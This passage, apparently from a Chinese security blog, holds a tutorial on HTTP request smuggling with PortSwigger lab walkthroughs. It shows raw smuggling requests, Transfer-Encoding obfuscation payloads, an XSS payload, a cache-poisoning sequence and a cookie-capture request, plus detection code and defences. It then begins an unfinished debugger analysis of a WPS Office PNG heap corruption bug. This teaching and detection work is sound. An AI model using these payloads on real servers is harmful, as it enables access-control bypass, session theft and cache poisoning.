假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。 比如我们构造请求 1234567GET / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n 前端服务器收到该请求，通过读取Content-Length，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，它就认为这是收到了两个请求，分别是 1234567第一个GET / HTTP/1.1\\r\\nHost: example.com\\r\\n第二个GET / secret HTTP/1.1\\r\\nHost: example.com\\r\\n 这就导致了请求走私 2 CL-CL在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。 https://tools.ietf.org/html/rfc7230#section-3.3.3 但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。 此时恶意攻击者可以构造一个特殊的请求 1234567POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na 中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。 12GET /index.html HTTP/1.1\\r\\nHost: example.com\\r\\n 从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。 这时候正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是 12aGET /index.html HTTP/1.1\\r\\nHost: example.com\\r\\n 这时候用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。 但是两个Content-Length这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在RFC2616的第4.4节中，规定:如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。服务器在这里的实现更容易出问题。 https://tools.ietf.org/html/rfc2616#section-4.4 3 CL-TE所谓CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding这一请求头。 chunk传输数据格式如下，其中size的值由16进制表示。 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] Lab 地址：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 构造数据包 1234567891011121314151617POST / HTTP/1.1Host: acb51fb91e44b90480444e0700f300db.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://acb51fb91e44b90480444e0700f300db.web-security-academy.net/Connection: closeCookie: session=8PEc1O3nvJK1TMe34CRurWHbtmNlffXLUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Connection: keep-aliveContent-Length: 13Transfer-Encoding: chunked0ol4three 连续发送几次请求就可以获得该响应。 由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为13，也就是 1230\\r\\n\\r\\nol4three 当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到0\\r\\n\\r\\n时，认为已经读取到结尾了，但是剩下的字母ol4three就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。 123OL4THREEPOST / HTTP/1.1\\r\\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n...... 服务器在解析时就会产生报错。 4 TE-CL所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。 Lab地址：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl 构造数据包 1234567891011121314POST / HTTP/1.1Host: acd21f681f756cf681ed0710009f00f1.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: session=Ucdk8vByxAP8kqS8Ww6N7GuJ1jtDuSTEContent-Length: 4Transfer-Encoding: chunked12oPOST / HTTP/1.10 由于前端服务器处理T ransfer-Encoding，当其读取到0\\r\\n\\r\\n时，认为是读取完毕了，此时这个请求对代理服务来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\\r\\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是 1234GPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 成功报错。 5 TE-TETE-TE，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，从而使其中一个服务器不处理Transfer-Encoding请求头。从某种意义上还是CL-TE或者TE-CL。 Lab地址：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header 构造数据包 1234567891011121314151617181920212223POST / HTTP/1.1Host: acab1f6b1ec9478a801fb8a90003005b.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-headerConnection: closeCookie: session=V9iX0s5p7jOrkL0RMxDZxVvZdqMgYgjoUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5coPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 PortSwigger 给出了一些可用于混淆的 payload： 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding[空格]: chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[空格]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked 其他攻击实例以下是 PortSwigger 列举的攻击方式，另外还有 @Regilero 大佬的更多姿势： https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/#toc3 https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/#toc4 https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/#toc7 1 绕过前端服务器的安全控制在这个网络环境中，前段服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后段服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用CL-TE和TE-CL绕过前端的访问控制 1.1 使用CL-TE绕过前端服务器安全控制Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te 实验的最终目的是获取admin权限并删除用户carlos 我们直接访问/admin,会返回提示Path /admin is blocked，看样子是被前端服务器阻止了，根据题目的提示CL-TE，我们可以尝试构造数据包 12345678910111213141516POST / HTTP/1.1Host: ac001ff21f8e14a68000ff8100ed0001.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: session=47f6w4amWuXJBmai7o4kaxEvPqMX36QHContent-Length: 42Transfer-Encoding: chunked0GET /admin HTTP/1.1foo: bar 进行多次请求之后，我们可以获得走私过去的请求的响应 提示只有是以管理员身份访问或者在本地登录才可以访问/admin接口。 在下方走私的请求中，添加一个Host: localhost请求头，然后重新进行请求，一次不成功多试几次。 如图所示，我们成功访问了admin界面。也知道了如何删除一个用户，也就是对/admin/delete?username=carlos进行请求。 修改下走私的请求包再发送几次即可成功删除用户carlos。 需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个\\r\\n不能丢弃。 1.2 使用TE-CL绕过前端服务器安全控制Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl 这个实验与上一个就十分类似. 2 获取前端服务器重写请求字段在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如： 描述TLS连接所使用的协议和密码 包含用户IP地址的XFF头 用户的会话令牌ID 总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤： 找一个能够将请求参数的值输出到响应中的POST请求 把该POST请求中，找到的这个特殊的参数放在消息的最后面 然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。 怎么理解呢，还是做一下实验来一起来学习下吧。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting 实验的最终目的还是删除用户 carlos。 我们首先进行第一步骤，找一个能够将请求参数的值输出到响应中的POST请求。 在网页上方的搜索功能就符合要求 构造数据包 1234567891011121314151617POST / HTTP/1.1Host: acc61f801f8a522a80a1356a00b6005b.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedCookie: session=h1Ca94Fnfl4FURsBEWq2zeZy6mygOG3mContent-Length: 78Transfer-Encoding: chunked0POST / HTTP/1.1Content-Length: 70Connection: closesearch=ol4three 多次请求之后就可以获得前端服务器添加的请求头 这是如何获取的呢，可以从我们构造的数据包来入手，可以看到，我们走私过去的请求为 12345POST / HTTP/1.1Content-Length: 70Connection: closesearch=ol4three 其中Content-Length的值为70，显然下面携带的数据的长度是不够70的，因此后端服务器在接收到这个走私的请求之后，会认为这个请求还没传输完毕，继续等待传输。 接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达70时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。 在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。 在走私的请求上添加这个字段，然后走私一个删除用户的请求就好了。 3 获取其他用户的请求在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests 实验的最终目的是获取其他用户的Cookie用来访问其他账号。 我们首先去寻找一个能够将传入的信息存储到网站中的POST请求表单，很容易就能发现网站中有一个用户评论的地方。 抓取POST请求并构造数据包 1234567891011121314151617POST / HTTP/1.1Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Cookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwaContent-Length: 267Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.netCookie: session=oGESUVlKzuczaZSzsazFsOCQ4fdLetwaContent-Length: 400csrf=JDqCEvQexfPihDYr08mrlMun4ZJsrpX7&amp;postId=5&amp;name=meng&amp;email=email%40qq.com&amp;website=&amp;comment= 这样其实就足够了，但是有可能是实验环境的问题，我无论怎么等都不会获取到其他用户的请求，反而抓了一堆我自己的请求信息。不过原理就是这样，还是比较容易理解的，最重要的一点是，走私的请求是不完整的。 4 利用反射型XSS我们可以使用HTTP走私请求搭配反射型XSS进行攻击，这样不需要与受害者进行交互，还能利用漏洞点在请求头中的XSS漏洞。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss 在实验介绍中已经告诉了前端服务器不支持分块编码，目标是执行alert(1) 首先根据UA出现的位置构造Payload 然后构造数据包 1234567891011POST / HTTP/1.1Host: ac801fd21fef85b98012b3a700820000.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 123Transfer-Encoding: chunked0GET /post?postId=5 HTTP/1.1User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#Content-Type: application/x-www-form-urlencoded 此时在浏览器中访问，就会触发弹框 再重新发一下，等一会刷新，可以看到这个实验已经解决了。 5 进行缓存投毒一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。 Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning 实验环境中提供了漏洞利用的辅助服务器。 需要添加两个请求包，一个POST，携带要走私的请求包，另一个是正常的对JS文件发起的GET请求。 以下面这个JS文件为例 1/resources/js/labHeader.js 编辑响应服务器 构造POST走私数据包 123456789101112POST / HTTP/1.1Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.netContent-Length: 129Transfer-Encoding: chunked0GET /post/next?postId=3 HTTP/1.1Host: acb11fe31e16e96b800e125a013b009f.web-security-academy.netContent-Length: 10123 然后构造GET数据包 1234GET /resources/js/labHeader.js HTTP/1.1Host: ac761f721e06e9c8803d12ed0061004f.web-security-academy.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Connection: close POST请求和GET请求交替进行，多进行几次，然后访问js文件，响应为缓存的漏洞利用服务器上的文件。 访问主页，成功弹窗，可以知道，js文件成功的被前端服务器进行了缓存。 如何检测检测思路来自于这里，这里提供下检测的demo1.CL-TEPayload： 12345678910POST / HTTP/1.1Host: test.comTransfer-Encoding: chunkedContent-Length: 41\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n 检测思路 Content-Length为4的时候，后段chunk收到长度为1的数据快，但是没有结束标志，一直等待，导致前端响应超时（一般超过5s） 12345678POST / HTTP/1.1Host: test.comTransfer-Encoding: chunkedContent-Length: 41\\r\\nZ Content-Length为11的时候，此时的G是一个无效的块大小值，所以请求结束，不会超时 123456789POST / HTTP/1.1Host: test.comTransfer-Encoding: chunkedContent-Length: 111\\r\\nZ\\r\\nG\\r\\n\\r\\n 因此如果 Content-Length 为 4的响应大于5s ，且 Content-Length 为 4的请求时间远大于 Content-Length 为 11的请求时间，说明存在漏洞。 2 TE-CLPayload： 123456789POST / HTTP/1.1Host: test.comContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding : chunked0\\r\\n\\r\\nX 检测思路： Content-Length 为 6时，后端处理的Content-Length为6，但收到的数据体0\\r\\n\\r\\n，因此后端会一直等待第6个字节，直到超时。 12345678POST / HTTP/1.1Host: test.comContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding : chunked0\\r\\n\\r\\n Content-Length 为 5时，后端收到的数据体0\\r\\n\\r\\n，不会超时。 12345678POST / HTTP/1.1Host: test.comContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding : chunked0\\r\\n\\r\\n 因此如果 Content-Length 为 6的响应大于5s ，且 Content-Length 为 6的请求时间远大于 Content-Length 为 5的请求时间，说明存在漏洞。 3 核心demo实现因为CL-TE和TE-CL互斥，因此如果存在CL-TE就跳过TE-CL检测，但检测到存在了漏洞时，进行recheck确认后输出。 完整代码：https://github.com/jweny/HTTP-Request-Smuggling-Checker 12345678910111213141516171819202122232425262728def check_CLTE(self): result = self.calcTime(4, &quot;1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n&quot;, 11, &quot;1\\r\\nZ\\r\\nQ\\r\\n\\r\\n\\r\\n&quot;) return resultdef check_TECL(self): result = self.calcTime(6, &quot;0\\r\\n\\r\\nX&quot;, 5, &quot;0\\r\\n\\r\\n&quot;) return resultdef calcTime(self, length_big_time, payload_big_time, length_small_time, payload_small_time): # todo 判断self.payload_headers 不为空 for headers in self.payload_headers: headers['Content-Length'] = length_big_time big_time = self.getRespTime(headers, payload_big_time) if not big_time: big_time = 0 if big_time &lt; 5: continue # Content-Length == 11 headers['Content-Length'] = length_small_time small_time = self.getRespTime(headers, payload_small_time) if not small_time: small_time = 1 if big_time &gt; 5 and big_time / small_time &gt;= 5: self.valid = True self.type = &quot;CL-TE&quot; self.result_headers = [headers] return True return False 如何防御 禁用代理服务器与后端服务器之间的 TCP 连接重用 使用 HTTP/2 协议 前后端使用相同的服务器 以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用 HTTP/2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP/2 协议的服务器也会兼容 HTTP/1.1。从本质上来说，HTTP 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现 RFC7230-7235 中所规定的的标准，但这也是最难做到的。 对于HTTP/2 能避免请求走私的原理，去查了一下HTTP/2 简介，总结一下，HTTP/1.1 的一些特性为请求走私创造了条件： 纯文本，以换行符作为分隔符 序列和阻塞机制 而在HTTP/2 中已经没有了产生请求走私的机会 使用二进制编码且分割为更小的传输单位（帧，拥有编号，可乱序传输） 同一个来源的所有通信都在一个 TCP 连接上完成，此连接可以承载任意数量的双向数据流 1With the new binary framing mechanism in place, HTTP/2 no longer needs multiple TCP connections to multiplex streams in parallel; each stream is split into many frames, which can be interleaved and prioritized. As a result, all HTTP/2 connections are persistent, and only one connection per origin is required, which offers numerous performance benefits. 参考链接：https://paper.seebug.org/1048/#5 https://xz.aliyun.com/t/7501 https://xz.aliyun.com/t/6631 HTTP pipelining HTTP/2 简介 https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn https://portswigger.net/web-security/request-smuggling/exploiting https://blog.riskivy.com/流量夹带http-request-smuggling-检测方案的实现/ https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn https://paper.seebug.org/1048/","link":"/2020/09/12/WEB/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"},{"title":"金山WPS Office远程堆损坏漏洞","text":"总览WPS Office是由Microsoft珠海的中国软件开发商金山软件开发的办公套件，适用于Microsoft Windows，macOS，Linux，iOS和Android。WPS Office由三个主要组件组成：WPS Writer，WPS Presentation和WPS Spreadsheet。个人基本版本可以免费使用。WPS Office软件中存在一个远程执行代码漏洞，是当Office软件在分析特制Office文件时不正确地处理内存中的对象时引起的。成功利用此漏洞的攻击者可以在当前用户的上下文中运行任意代码。故障可能会导致拒绝服务。漏洞产品WPS Office，影响版本11.2.0.9453。 漏洞分析在WPS Office中用于图像格式解析的Qt模块中发现堆损坏。嵌入WPS office的特制图像文件可能会触发此漏洞。打开特制的文档文件时，触发访问冲突。EDX指向数组的指针，而EAX是指向数组的索引。 1234567890:000&gt; g(c50.b4): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001ceip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210202QtCore4!QMatrix::dy+0x48a8:6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? 崩溃是如何触发的？让我们看一下PNG标头格式。 123456700029E30 FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 ÿ‰PNG........IHD00029E40 52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A R...€...Æ.......00029E50 27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98 'ü....gAMA..±ˆ•˜00029E60 F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00 ô¦...0PLTE...€..00029E70 00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80 .€.€€...€€.€.€€€00029E80 80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00 €€ÀÀÀÿ...ÿ.ÿÿ...00029E90 FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00 ÿÿ.ÿ.ÿÿÿÿÿ{.±Ä.. 从偏移量0x29E31开始-0x29E34是PNG文件格式的签名标头。PNG头文件的结构： 1PNG signature --&gt; IHDR --&gt; gAMA --&gt; PLTE --&gt; pHYs --&gt; IDAT --&gt; IEND 在这种情况下，当WPS Office Suite中使用的QtCore库解析PLTE结构并触发堆破坏时，该漏洞位于Word文档中的嵌入式PNG文件中。在偏移量0x29E82到0x29E85处，调色板的解析失败，从而触发了堆中的内存损坏。崩溃触发之前的堆栈跟踪： 12345678900 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a7101 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x23402 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec805 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b5906 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c9807 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x32508 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a 在QtCore4解析嵌入式图像之前，我们可以看到来自KSO模块的最后一次调用，试图处理图像kso！GdiDrawHoriLineIAlt。使用IDA Pro分解应用程序来分析发生异常的功能。最后的崩溃路径如下（WinDBG结果）： 12QtCore4!QMatrix::dy+0x48a8:6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? 在IDA Pro中打开时，我们可以按以下方式反汇编该函数： 1234567.text:67353315 push ebp.text:67353316 mov ebp, esp.text:67353318 movzx eax, byte ptr [ecx+edx] ; crash here.text:6735331C mov ecx, [ebp+arg_0].text:6735331F mov edx, [ecx].text:67353321 mov eax, [edx+eax*4+10h].text:67353325 mov ecx, eax 使用故障转储中的信息，我们知道应用程序在0x67353321（移动eax，[edx + eax * 4 + 10h]）处触发了访问冲突。我们可以看到EAX寄存器由0xc0值控制。因此，从这里我们可以根据导致异常的指令对寄存器的状态进行一些假设。需要注意的重要一点是，在发生异常之前，我们可以看到ECX（0xc0）中包含的值被写入到以下指令所定义的任意位置： 1mov ecx, [ebp+arg_0] 此外，我们注意到，在我们的故障指令之外，EBP的偏移量存储在ECX寄存器中。我们在前面提到的指令（偏移量为0x6ba1331c）上设置了一个断点，以观察内存。断点触发后，我们可以看到第一个值c45adfbc引用了另一个指针，该指针应该是指向数组的指针。 12345678910111213141516Breakpoint 0 hiteax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001ceip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202QtCore4!QMatrix::dy+0x48a3:6ba1331c 8b4d08 mov ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc0:000&gt; dc ebp+8004f1a3c c45adfbc 00000048 00000000 6f13830f ..Z.H..........o004f1a4c 004f5cc8 00000000 00000000 00000000 .\\O.............004f1a5c 00000000 004f65a0 004f662c 00000000 .....eO.,fO.....004f1a6c 779eae8e 00000000 00000001 3f800000 ...w...........?004f1a7c 3f800000 3f31e4f8 3f800000 3f800000 ...?..1?...?...?004f1a8c 3f800000 3f31e4f8 3f800000 3de38800 ...?..1?...?...=004f1a9c 3de38800 3d9e1c8a 3c834080 004f3c00 ...=...=.@.&lt;.&lt;O.004f1aac 4101c71c 6ba13315 3f800000 4081c71c ...A.3.k...?...@ 从c45adfbc观察内存引用，发现另一个指针。第一个值ab69cf80始终表示为指向它所引用的任何地方的指针。指针ab69cf80基本上是我们指针的索引数组。 123456789101112131415161718190:000&gt; dc c45adfbcc45adfbc ab69cf80 d3544100 00000003 00000280 ..i..AT.........c45adfcc 0000055a 00000012 c0c0c0c0 1c3870e2 Z............p8.c45adfdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@....c45adfec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l....c45adffc c0c0c0c0 ???????? ???????? ???????? ....????????????c45ae00c ???????? ???????? ???????? ???????? ????????????????c45ae01c ???????? ???????? ???????? ???????? ????????????????c45ae02c ???????? ???????? ???????? ???????? ????????????????0:000&gt; dc ab69cf80ab69cf80 00000001 0000001c 00000010 00000001 ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crashab69cf90 ff000000 ff800000 ff008000 ff808000 ................ ab69cfa0 ff000080 ff800080 ff008080 ff808080 ................ab69cfb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAXab69cfc0 ff0000ff ffff00ff ff00ffff ffffffff ................ab69cfd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ab69cfe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ab69cff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ 因为我们知道崩溃的路径，所以我们可以使用下面的命令简单地设置一个断点。该命令将获得指针值“ edx + eax * 4 + 10”，并检查其是否满足0xc0。 12345678bp 6ba13321 &quot;.if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}&quot;0:000&gt; geax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001ceip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202QtCore4!QMatrix::dy+0x48a8:6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=???????? 如果观察堆栈，可以看到以下执行： 1234567891011121314004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74004f1a3c c45adfbc 004f1a40 00000048 004f1a44 00000000 004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f004f1a4c 004f5cc8 004f1a50 00000000 004f1a54 00000000 004f1a58 00000000 004f1a5c 00000000 004f1a60 004f65a0 004f1a64 004f662c 004f1a68 00000000 004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e 如果我们反汇编6ba3cb98，则可以看到以下反汇编代码。真正的根本原因在于此代码。 123456789101112131415166ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h]6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch]6ba3cb92 52 push edx6ba3cb93 8bd7 mov edx,edi6ba3cb95 ff5580 call dword ptr [ebp-80h]6ba3cb98 8b4e7c mov ecx,dword ptr [esi+7Ch]C pseudo codegrad = *(&amp;ptr_grad);if ( grad &gt; 0.0099999998 ){ input_value = grad_size(check, size, input); ptr_grad = *(input); ... cut here ... 我们在6ba3cb89地址上设置断点，并观察ESI + 0xB4，我们可以看到一个指针指向另一个位置： 1234567891011121314151617181920212223242526272829303132333435360:000&gt; reax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001ceip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65:6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc0:000&gt; 